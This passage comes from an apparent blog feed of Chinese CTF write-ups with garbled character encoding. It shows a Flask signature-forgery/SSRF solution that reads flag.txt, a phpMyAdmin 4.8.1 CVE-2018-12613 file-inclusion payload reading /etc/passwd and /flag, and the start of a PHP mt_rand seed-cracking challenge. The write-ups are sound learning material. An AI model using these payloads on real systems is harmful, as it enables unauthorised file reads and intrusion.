&#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>è¿›å…¥ç¯å¢ƒä¹‹å‰è¿˜æœ‰ä¸€ä¸ªå°æç¤ºã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag is in ./flag.txt</span><br></pre></td></tr></table></figure></p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>å…ˆä»è·¯ç”±çœ‹èµ·ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure></p>
<p>å½“è®¿é—®<code>ip/geneSign</code>æ—¶ï¼Œparamä»¥GETæ–¹å¼ä¼ å…¥ï¼Œç„¶åå°†<code>action=scan</code>ï¼Œæœ€åè°ƒç”¨<code>getSign(action, param)</code>ã€‚è€Œè¯¥å‡½æ•°è¿”å›ä¸€ä¸ªmd5åŠ å¯†å¾—å­—ç¬¦ä¸²ã€‚</p>
<p>å†æŸ¥çœ‹ä¸‹ä¸€ä¸ªè·¯ç”±ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br></pre></td></tr></table></figure></p>
<p>å½“è®¿é—®<code>ip/De1ta</code>æ—¶ï¼ŒGETä¼ å…¥paramï¼Œcookieä¼ å…¥actionå’Œsignï¼Œç„¶åæ‰§è¡Œ<code>waf(param)</code>ï¼Œè¯¥å‡½æ•°åˆ¤æ–­paramå‚æ•°ï¼ˆç»è¿‡å¤„ç†åï¼‰æ˜¯å¦ä»¥<code>gopher</code>å’Œ<code>file</code>å¼€å¤´ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½ä½¿ç”¨è¿™ä¸¤ä¸ªåè®®è¿›è¡Œæ–‡ä»¶è¯»å–ã€‚</p>
<p>å¦‚æœ<code>waf(param)</code>å‡½æ•°è¿”å›<code>False</code>ï¼Œåˆ™åˆ›å»ºä¸€ä¸ª<code>Task</code>å¯¹è±¡ï¼Œç„¶åæ‰§è¡Œ<code>task.Exec()</code>ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> resp</span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure></p>
<p>ä¼šé¦–å…ˆæ£€æŸ¥<code>self.checkSign()</code> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure></p>
<p>åªæœ‰æ»¡è¶³<code>getSign(self.action, self.param) == self.sign</code>æ‰å¯ä»¥ç»§ç»­æ‰§è¡Œï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªè¦è§£å†³çš„ç‚¹ã€‚</p>
<p>å‡è®¾æˆ‘ä»¬æ»¡è¶³ä¸Šè¿°æƒ…å†µäº†ï¼Œæ¥ä¸‹æ¥å…ˆåˆ¤æ–­<code>if "scan" in self.action</code>ï¼Œå¦‚æœæ»¡è¶³ï¼Œåˆ™ä¼šæ‰§è¡Œ<code>resp = scan(self.param)</code>ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br></pre></td></tr></table></figure></p>
<p>è¯¥å‡½æ•°ä¼šå»è®¿é—®<code>param</code>å¹¶ä¸”è¯»å–å…¶ä¸­å¾—å†…å®¹å¹¶è¿”å›ã€‚<strong>çŒœæƒ³ï¼šåˆ©ç”¨è¿™ä¸ªè¯»å–flag.txtä¸­å¾—å†…å®¹</strong>ã€‚å¦‚æœ<code>param</code>çš„ç¡®æœ‰å†…å®¹ï¼Œé‚£ä¹ˆè¿”å›åˆ°<code>Exec()</code>ï¼Œç„¶åæ‰§è¡Œ<code>tmpfile.write(resp)</code>ï¼Œä¹Ÿå°±æ˜¯å°†è¯»å–å¾—å†…å®¹å†™åˆ°<code>./%s/result.txt</code>ã€‚</p>
<p>å¦‚æœæ»¡è¶³<code>if "read" in self.action</code>ï¼Œåˆ™ä¼šè¯»å–<code>./%s/result.txt</code>ä¸­çš„å†…å®¹ï¼Œç„¶åé€šè¿‡<code>result</code>è¿”å›ã€‚</p>
<p>æœ€åæ‰§è¡Œ<code>return json.dumps(task.Exec())</code>ï¼Œå°†<code>Exec()</code>ä¸­çš„å†…å®¹ä»¥jsonæ ¼å¼æ‰“å°å‡ºæ¥ã€‚</p>
<p>æ€è·¯ï¼šé€šè¿‡å¯¹ä»£ç çš„åˆ†æï¼Œæœ‰äº†åˆæ­¥æ€è·¯ï¼š</p>
<ol type="1">
<li>å…ˆå°†flag.txtä¸­çš„å†…å®¹å†™åˆ°<code>./%s/result.txt</code>ä¸­ï¼Œä¹Ÿå°±æ˜¯actionä¸­å¾—æœ‰å­—ç¬¦ä¸²scanï¼›</li>
<li>ç„¶åè¯»å–<code>./%s/result.txt</code>ä¸­çš„å†…å®¹ï¼ŒæˆåŠŸè¯»å–åˆ°flagï¼Œä¹Ÿå°±æ˜¯actionä¸­ä¹Ÿè¦æœ‰å­—ç¬¦ä¸²readï¼›</li>
</ol>
<p>éš¾é¢˜ï¼š</p>
<ul>
<li>å¦‚ä½•æ»¡è¶³<code>self.checkSign()</code>ï¼Œä¹Ÿå°±æ˜¯<code>getSign(self.action, self.param) == self.sign</code></li>
</ul>
<p>å¯ä»¥åˆ©ç”¨<code>/geneSign?param=flag.txt</code>ï¼Œä½†æ˜¯è¿™æ ·å­å¾—åˆ°çš„æ˜¯<code>getSign(scan, flag.txt)</code>çš„å€¼ï¼Œæˆ‘ä»¬ä¸ä»…éœ€è¦<code>scan</code>è¿˜éœ€è¦<code>read</code>ã€‚</p>
<p>æ³¨æ„ <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure></p>
<p>åˆ†æï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">param=flag.txtread, action=scan</span><br><span class="line">secert_key + param + action = secert_key + flag.txtreadscan</span><br></pre></td></tr></table></figure></p>
<p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬å…ˆç”¨<code>/geneSign?param=flag.txtread</code>å¾—åˆ°<code>secert_key + flag.txtreadscan</code>çš„MD5å€¼ï¼Œå°†å…¶ä½œä¸º<code>sign</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411114816.png" /></p>
<p>ç„¶åæˆ‘ä»¬è®¿é—®<code>/De1ta?param=flag.txt</code>ï¼Œç„¶åcookieä¸­<code>Cookie: sign=83f8669fd768b006207e62cf66f61904;action=readscan</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411114844.png" /></p>
<p>æˆåŠŸè¯»å–flagï¼</p>
<p>è¿™æ˜¯å› ä¸ºæ­¤æ—¶çš„<code>sign</code>å…¶å®æ˜¯<code>hashlib.md5(secert_key + flag.txtread + scan).hexdigest()</code>ã€‚è€Œæ‰§è¡Œ<code>self.checkSign()</code>æ—¶<code>getSign(self.action, self.param) -&gt; hashlib.md5(secert_key + flag.txt + readscan).hexdigest()</code>ï¼Œè‡ªç„¶å°±æ»¡è¶³äº†<code>getSign(self.action, self.param) == self.sign</code>ã€‚å¹¶ä¸”actionä¸­<code>read</code>å’Œ<code>scan</code>éƒ½æœ‰ï¼Œä¹Ÿå°±æ˜¯å…ˆå°†flag.txtå†…å®¹å†™å…¥<code>./%s/result.txt</code>ï¼Œç„¶ååœ¨è¯»å–è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œä»è€Œå¾—åˆ°äº†flagã€‚</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>æœ¬é¢˜å¯¹äºSSRFçš„è€ƒå¯Ÿå°±åœ¨äº<code>urllib.urlopen(param).read()[:50]</code>ï¼Œåˆ©ç”¨è¿™è¯»å–flagæ–‡ä»¶çš„å†…å®¹ã€‚</p>
<p>æœ¬é¢˜ä¸»è¦è€ƒå¯Ÿçš„å…¶å®æ˜¯ä»£ç å®¡è®¡çš„èƒ½åŠ›ï¼</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
        <tag>python</tag>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>GWCTF 2019 æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</title>
    <url>/2022/03/24/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<p>BUUCTF ç½‘å€ï¼šhttps://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒä¹‹åï¼Œä¸è®ºæ˜¯æ•°æ®åŒ…è¿˜æ˜¯é¡µé¢æºç ï¼Œä»€ä¹ˆä¿¡æ¯éƒ½æ²¡æœ‰ï¼Œåªæœ‰å¦‚ä¸‹çœ‹ä¸æ‡‚çš„å­—</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204732.png" /></p>
<p>å› æ­¤ï¼Œå†³å®šæ‰«æç›®å½•ï¼Œç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204816.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204824.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204843.png" /></p>
<p>å°†æ‰€æœ‰éƒ½è®¿é—®ä¸€æ¬¡ï¼Œå‘ç°åªæœ‰ <code>/phpmyadmin</code> æœ‰ç”¨ï¼Œç•Œé¢å¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204938.png" /></p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>é€šè¿‡è¯¥é¡µé¢å‘ç°ï¼š</p>
<ol type="1">
<li><p>phpmyadmin ç‰ˆæœ¬ä¸º 4.8.1</p></li>
<li><p>æœåŠ¡å™¨ç”¨çš„æ˜¯ apache</p></li>
<li><p>æ•°æ®åº“æ˜¯ mysql</p></li>
<li><p>PHPç‰ˆæœ¬ä¿¡æ¯ä¸º 7.2.24-0ubuntu0.18.04.1</p></li>
<li><p>ç³»ç»Ÿä¸º Ubuntu</p></li>
</ol>
<p>ç¬¬ä¸€æ¬¡ç¢°åˆ°è¿™ç§é¢˜ç›®ï¼Œæœ‰ç‚¹æ‡µé€¼ï¼Œå°±å»ç™¾åº¦äº†ä¸€ä¸‹ <code>phpmyadmin 4.8 æ¼æ´</code> å‘ç°äº†å­˜åœ¨ <code>CVE-2018-12613</code> è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ã€‚å°†æ‰¾åˆ°çš„payloadï¼ˆè¿™é‡Œè¦æ³¨æ„ç³»ç»Ÿæ˜¯Windowsè¿˜æ˜¯Linuxï¼‰å°è¯•ä¸€ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd # linux payload</span><br></pre></td></tr></table></figure>
<p>ç»“æœï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205506.png" /></p>
<p>å‘ç°ç¡®å®å­˜åœ¨æ¼æ´ï¼Œé‚£ä¹ˆå°† <code>/etc/passwd</code> æ”¹ä¸ºæˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶è·¯å¾„å³å¯ã€‚é—®é¢˜æ˜¯è¿™é‡Œæˆ‘ä»¬ä¸çŸ¥é“ flag åœ¨å“ªï¼Œä¸€èˆ¬åœ¨æ ¹ç›®å½•æˆ–è€…ç½‘ç«™ç›®å½•ï¼Œè¿™é‡ŒåªçŸ¥é“æ ¹ç›®å½•ï¼Œæ‰€ä»¥å°±å°è¯•ä»¥ä¸‹æ ¹ç›®å½•ï¼Œå³</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ° flag</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205738.png" /></p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>æœ¬é¢˜è€ƒçš„æ˜¯å¹³å¸¸çš„æ€»ç»“ï¼Œä»¥åŠå¯¹ä¿¡æ¯çš„æ•æ„Ÿåº¦ã€‚çœ‹åˆ°ä¸€äº›ç‰ˆæœ¬ä¿¡æ¯è¦æƒ³åˆ°æ˜¯å¦å­˜åœ¨è¯¥ç‰ˆæœ¬ç‰¹æœ‰çš„ä¿¡æ¯ï¼Œå¹¶ä¸”å³ä½¿æœç´¢ã€‚å¹³å¸¸é‡åˆ°è¿™ç±»çš„é—®é¢˜ä¹Ÿè¦å¤šç§¯ç´¯ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>phpmyadmin æ¼æ´</tag>
        <tag>CVE-2018-12613</tag>
      </tags>
  </entry>
  <entry>
    <title>GWCTF 2019 æ¯ç‡¥çš„æŠ½å¥–</title>
    <url>/2022/04/26/GWCTF%202019%20%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BGWCTF%202019%5Dæ¯ç‡¥çš„æŠ½å¥–">GWCTF 2019 æ¯ç‡¥çš„æŠ½å¥–</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">1. é¢˜ç›®ä¿¡æ¯</h1>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426143656.png" /></p>
<p>éœ€è¦æˆ‘ä»¬å†™å…¥å®Œæ•´çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”å·²ç»ç»™äº†æˆ‘ä»¬å‰åä½ã€‚æŸ¥çœ‹æºç å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼šcheck.phpï¼Œç›´æ¥è®¿é—®ï¼Œå¾—åˆ°å¦‚ä¸‹æºç ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = substr(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="phpä¼ªéšæœºæ•°">2. PHPä¼ªéšæœºæ•°</h1>
<p>è¯¦ç»†çš„å¯ä»¥çœ‹ä¸€ä¸‹ä¸‹é¢çš„èµ„æ–™ï¼š</p>
<ul>
<li>[[PHPçŸ¥è¯†ç‚¹#21 mt_srandå’Œmt_randä¼ªéšæœºæ•°ç ´è§£]]</li>
<li>å‚è€ƒï¼š<a href="https://www.freebuf.com/vuls/192012.html">PHP mt_randå®‰å…¨æ‚è°ˆåŠåº”ç”¨åœºæ™¯è¯¦è§£ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></li>
</ul>
<p>è¿™é‡Œç®€å•çš„è¯´ä¸‹ä»€ä¹ˆå«åšä¼ªéšæœºæ•°ã€‚<strong>éšæœºæ•°</strong>ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯åœ¨ç»™å®šèŒƒå›´å†…éšæœºé€‰æ‹©çš„æ•°ï¼Œæ²¡æœ‰ä»»ä½•è§„å¾‹å¯è¨€ã€‚<strong>ä¼ªéšæœºæ•°</strong>ï¼Œ<strong>æ»¡è¶³ä¸€å®šçš„è§„å¾‹</strong>ï¼Œä½†æ˜¯è¿™äº›æ•°å­—èƒ½å¤Ÿé€šè¿‡éšæœºæ•°æ£€éªŒã€‚</p>
<p>phpé€šè¿‡mt_srand()å’Œmt_rand()ä¸¤ä¸ªå‡½æ•°å®ç°ä¼ªéšæœºæ•°çš„ç”Ÿæˆã€‚é¦–å…ˆåˆ©ç”¨mt_srand(seed)ä¼ å…¥ä¸€ä¸ªç§å­ï¼ˆç®€å•æ¥è¯´ï¼Œå°±æ˜¯ç¡®å®šæŸç§è§„å¾‹ï¼‰ï¼Œç„¶ååˆ©ç”¨mt_rand(èŒƒå›´)ç”Ÿæˆç‰¹å®šèŒƒå›´å†…çš„ä¼ªéšæœºæ•°ã€‚</p>
